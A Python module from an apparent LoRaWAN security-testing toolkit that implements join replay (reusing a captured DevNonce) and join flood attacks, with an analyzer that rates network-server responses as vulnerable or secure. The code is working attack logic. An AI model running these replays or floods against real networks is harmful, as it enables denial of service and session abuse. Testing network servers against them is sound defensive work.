"""Join procedure abuse attacks - refactored to new API."""

from __future__ import annotations

import secrets
import time
from dataclasses import dataclass
from typing import TYPE_CHECKING, Any

from lora_attack_toolkit.attacks.base import BaseAttack
from lora_attack_toolkit.attacks.result import AttackResult
from lora_attack_toolkit.attacks.analyzer import AttackAnalyzer
from lora_attack_toolkit.attacks.packet_capture import PacketCapture
from lora_attack_toolkit.attacks.validation import validate_criteria
from lora_attack_toolkit.lorawan.lifecycle.join import (
    perform_otaa_join,
    perform_otaa_join_with_devnonce,
)
from lora_attack_toolkit.lorawan.protocol.frames import build_join_request

if TYPE_CHECKING:
    from lora_attack_toolkit.attacks.context import AttackContext
    from lora_attack_toolkit.core.schema_v1 import ExpectedBehavior, JoinFloodConfigV1


@dataclass
class VirtualDevice:
    """Virtual device for join flood attack."""
    
    dev_eui: bytes
    app_eui: bytes
    app_key: bytes
    dev_nonce: bytes
    
    @property
    def dev_eui_hex(self) -> str:
        return self.dev_eui.hex()
    
    def build_join_request(self) -> bytes:
        """Build JoinRequest for this virtual device."""
        return build_join_request(
            app_eui=self.app_eui,
            dev_eui=self.dev_eui,
            dev_nonce=self.dev_nonce,
            app_key=self.app_key,
        )


class JoinAbuseAnalyzer(AttackAnalyzer):
    """Analyzer for join procedure abuse attack results."""
    
    def analyze(
        self, capture: PacketCapture, expected: ExpectedBehavior | None = None
    ) -> dict[str, Any]:
        """Analyze join abuse attack results."""
        stats = capture.get_stats()
        
        # Count join requests
        join_requests = [p for p in capture.uplinks if p.packet_type == "join_request"]
        join_accepts = [p for p in capture.downlinks if p.packet_type == "join_accept"]
        
        if not join_requests:
            return {
                "success": False,
                "message": "No join requests captured",
                "metrics": {"uplinks_captured": stats["total_uplinks"]},
            }
        
        # Check for replay attack metadata
        replay_packet = None
        for packet in join_requests:
            if packet.metadata.get("replay") is True:
                replay_packet = packet
                break
        
        if replay_packet:
            # This is a join-replay attack
            ns_accepted = replay_packet.metadata.get("ns_accepted", False)
            dev_nonce = replay_packet.metadata.get("dev_nonce", "unknown")
            
            if ns_accepted:
                # Vulnerability found!
                metrics = {
                    "attack_type": "join_replay",
                    "join_requests_sent": len(join_requests),
                    "join_accepts_received": len(join_accepts),
                    "ns_accepted_replay": True,
                    "duplicate_devnonce_accepted": True,
                    "dev_nonce": dev_nonce,
                    "security_status": "VULNERABLE",
                    "total_uplinks": stats["total_uplinks"],
                    "total_downlinks": stats["total_downlinks"],
                }
                
                result = {
                    "success": False,  # Attack exposed vulnerability
                    "message": f"⚠️  VULNERABILITY: NS accepted duplicate DevNonce {dev_nonce}",
                    "metrics": metrics,
                }
                
                # Add validation if expected behavior provided
                if expected:
                    validation = validate_criteria(
                        attack_type="join_replay",
                        criteria=expected.security_criteria,
                        metrics=metrics,
                        capture_stats=stats,
                        secure_behavior=expected.secure_behavior,
                    )
                    result.update(validation.to_dict())
                    result["validation_summary"] = validation.get_summary()
                
                return result
            else:
                # Secure behavior
                metrics = {
                    "attack_type": "join_replay",
                    "join_requests_sent": len(join_requests),
                    "join_accepts_received": len(join_accepts),
                    "ns_accepted_replay": False,
                    "duplicate_devnonce_rejected": True,
                    "dev_nonce": dev_nonce,
                    "security_status": "SECURE",
                    "total_uplinks": stats["total_uplinks"],
                    "total_downlinks": stats["total_downlinks"],
                }
                
                result = {
                    "success": True,
                    "message": f"✓ NS rejected duplicate DevNonce {dev_nonce} (secure behavior)",
                    "metrics": metrics,
                }
                
                # Add validation if expected behavior provided
                if expected:
                    validation = validate_criteria(
                        attack_type="join_replay",
                        criteria=expected.security_criteria,
                        metrics=metrics,
                        capture_stats=stats,
                        secure_behavior=expected.secure_behavior,
                    )
                    result.update(validation.to_dict())
                    result["validation_summary"] = validation.get_summary()
                
                return result
        else:
            # Flood attack
            elapsed_time = 0.0
            for packet in join_requests:
                if "elapsed_time" in packet.metadata:
                    elapsed_time = packet.metadata["elapsed_time"]
            
            rate = len(join_requests) / elapsed_time if elapsed_time > 0 else 0
            
            metrics = {
                "attack_type": "join_flood",
                "join_requests_sent": len(join_requests),
                "join_accepts_received": len(join_accepts),
                "flood_duration_sec": elapsed_time,
                "request_rate_per_sec": round(rate, 2),
                "total_uplinks": stats["total_uplinks"],
                "total_downlinks": stats["total_downlinks"],
            }
            
            message = f"Join flood executed: {len(join_requests)} requests sent"
            if elapsed_time > 0:
                message += f" at {rate:.2f} req/s"
            
            result = {
                "success": True,
                "message": message,
                "metrics": metrics,
            }
            
            # Add validation if expected behavior provided
            if expected:
                validation = validate_criteria(
                    attack_type="join_flood",
                    criteria=expected.security_criteria,
                    metrics=metrics,
                    capture_stats=stats,
                    secure_behavior=expected.secure_behavior,
                )
                result.update(validation.to_dict())
                result["validation_summary"] = validation.get_summary()
            
            return result


class JoinAbuseAttack(BaseAttack):
    """
    Join procedure abuse attack using new simplified API.
    
    Supports two attack modes:
    1. Join Replay: Capture and replay JoinRequest with same DevNonce
    2. Join Flood: Send multiple JoinRequests rapidly to stress NS
    """
    
    name = "join_abuse"
    
    def run(self, ctx: AttackContext) -> AttackResult:
        """
        Execute join abuse attack.
        
        Args:
            ctx: Attack context with all services and typed configuration
        
        Returns:
            AttackResult with execution outcome
        """
        ctx.logger.info(f"Starting {self.name} attack")
        
        try:
            # Get typed configuration
            config: JoinFloodConfigV1 = ctx.config
            
            # Start gateway
            ctx.logger.info("Starting gateway...")
            ctx.gateway.start()
            time.sleep(0.5)
            
            # Execute based on mode
            if config.mode == "replay":
                self._execute_join_replay(ctx)
            elif config.mode == "flood":
                self._execute_join_flood(ctx, config)
            else:
                raise ValueError(f"Unsupported mode: {config.mode}")
            
            # Stop gateway
            ctx.gateway.stop()
            
            # Analyze results
            ctx.logger.info("Analyzing results...")
            analyzer = JoinAbuseAnalyzer()
            analysis = analyzer.analyze(ctx.capture, ctx.expected)
            
            return AttackResult(
                attack_name=self.name,
                attack_type="join_abuse",
                success=analysis["success"],
                message=analysis["message"],
                metrics=analysis["metrics"],
                captured_packets=len(ctx.capture.uplinks) + len(ctx.capture.downlinks),
                validation_summary=analysis.get("validation_summary"),
                criteria_met=analysis.get("criteria_met"),
            )
            
        except Exception as e:
            ctx.logger.error(f"Attack failed: {e}", exc_info=True)
            return AttackResult(
                attack_name=self.name,
                attack_type="join_abuse",
                success=False,
                message=f"Attack execution failed: {str(e)}",
                metrics={},
                error=str(e),
            )
    
    def _execute_join_replay(self, ctx: AttackContext) -> None:
        """Execute join replay attack - replay JoinRequest with same DevNonce."""
        ctx.logger.info("Executing join replay attack")
        
        # Perform legitimate OTAA join and wait for JoinAccept
        ctx.logger.info("Performing OTAA join to capture DevNonce...")
        
        join_success = perform_otaa_join(
            device=ctx.device,
            gateway=ctx.gateway,
            radio=ctx.radio,
            timeout_sec=5.0,
            logger=ctx.logger,
        )
        
        if not join_success:
            ctx.logger.warning(
                "OTAA join failed - device credentials may be incorrect or NS unavailable"
            )
            return
        
        ctx.logger.info("OTAA join successful - captured DevNonce")
        
        # Send test uplink to confirm session works
        try:
            payload = bytes.fromhex("010203")
            uplink = ctx.device.build_data_uplink(payload=payload, f_port=10, confirmed=False)
            ctx.gateway.forward_uplink(uplink, ctx.radio)
            time.sleep(0.5)
        except RuntimeError as e:
            ctx.logger.warning(f"Could not build test uplink: {e}")
        
        # Extract DevNonce from device state
        dev_nonce = ctx.device.runtime.last_join_dev_nonce
        if not dev_nonce:
            raise RuntimeError("No DevNonce captured - OTAA join may have failed")
        
        dev_nonce_hex = dev_nonce.hex()
        
        ctx.logger.info(
            f"Replaying JoinRequest with SAME DevNonce={dev_nonce_hex}",
            extra={"dev_nonce": dev_nonce_hex, "replay": True},
        )
        
        # Attempt join with same DevNonce - NS should reject this!
        ns_responded, join_succeeded = perform_otaa_join_with_devnonce(
            device=ctx.device,
            gateway=ctx.gateway,
            radio=ctx.radio,
            dev_nonce=dev_nonce,
            timeout_sec=5.0,
            logger=ctx.logger,
        )
        
        if ns_responded:
            if join_succeeded:
                ctx.logger.warning(
                    "⚠️  VULNERABILITY: NS accepted duplicate DevNonce! Valid JoinAccept received",
                    extra={"security": "FAIL", "dev_nonce": dev_nonce_hex},
                )
            else:
                ctx.logger.warning(
                    "⚠️  VULNERABILITY: NS accepted duplicate DevNonce! (sent malformed JoinAccept)",
                    extra={"security": "FAIL", "dev_nonce": dev_nonce_hex},
                )
        else:
            ctx.logger.info(
                "✓ NS rejected duplicate DevNonce (secure behavior)",
                extra={"security": "PASS", "dev_nonce": dev_nonce_hex},
            )
        
        # Capture the result for analysis
        ctx.capture.capture_uplink(
            phy_payload=b"",
            packet_type="join_request",
            metadata={
                "phase": "execute",
                "replay": True,
                "dev_nonce": dev_nonce_hex,
                "ns_accepted": ns_responded,
                "join_succeeded": join_succeeded,
            },
        )
        
        ctx.logger.info("Join replay attack executed: 1 replay sent")
    
    def _execute_join_flood(self, ctx: AttackContext, config: JoinFloodConfigV1) -> None:
        """Execute join flood attack - send multiple JoinRequests."""
        ctx.logger.info(
            f"Executing join flood attack: {config.flood_count} requests",
            extra={"flood_count": config.flood_count},
        )
        
        # Generate virtual devices
        virtual_devices = self._generate_virtual_devices(ctx, config.virtual_devices)
        
        start_time = time.time()
        
        for i in range(config.flood_count):
            # Select virtual device (round-robin if multiple)
            device_idx = i % len(virtual_devices)
            virtual_device = virtual_devices[device_idx]
            
            # Build JoinRequest from virtual device
            join_request = virtual_device.build_join_request()
            dev_nonce = virtual_device.dev_nonce
            
            ctx.logger.info(
                f"Sending flood JoinRequest {i + 1}/{config.flood_count} "
                f"from device {virtual_device.dev_eui_hex} with DevNonce={dev_nonce.hex()}",
                extra={
                    "flood_number": i + 1,
                    "total": config.flood_count,
                    "dev_eui": virtual_device.dev_eui_hex,
                    "dev_nonce": dev_nonce.hex(),
                },
            )
            
            # Forward JoinRequest
            ctx.gateway.forward_uplink(join_request, ctx.radio)
            
            # Capture for analysis
            elapsed = time.time() - start_time
            ctx.capture.capture_uplink(
                phy_payload=join_request,
                packet_type="join_request",
                metadata={
                    "phase": "execute",
                    "flood_number": i + 1,
                    "dev_eui": virtual_device.dev_eui_hex,
                    "dev_nonce": dev_nonce.hex(),
                    "elapsed_time": elapsed,
                },
            )
            
            # Delay between requests
            if i < config.flood_count - 1:
                time.sleep(config.flood_interval_sec)
        
        elapsed_time = time.time() - start_time
        ctx.logger.info(
            f"Join flood attack executed: {config.flood_count} requests sent in {elapsed_time:.2f}s"
        )
    
    def _generate_virtual_devices(
        self, ctx: AttackContext, count: int
    ) -> list[VirtualDevice]:
        """Generate virtual devices for flood attack."""
        devices = []
        
        for i in range(count):
            dev_eui = secrets.token_bytes(8)
            app_eui = ctx.device.identity.app_eui  # Reuse same AppEUI
            app_key = ctx.device.keys.app_key  # Reuse same AppKey (for testing)
            dev_nonce = secrets.token_bytes(2)
            
            devices.append(
                VirtualDevice(
                    dev_eui=dev_eui,
                    app_eui=app_eui,
                    app_key=app_key,
                    dev_nonce=dev_nonce,
                )
            )
        
        ctx.logger.debug(f"Generated {count} virtual devices for flood attack")
        return devices
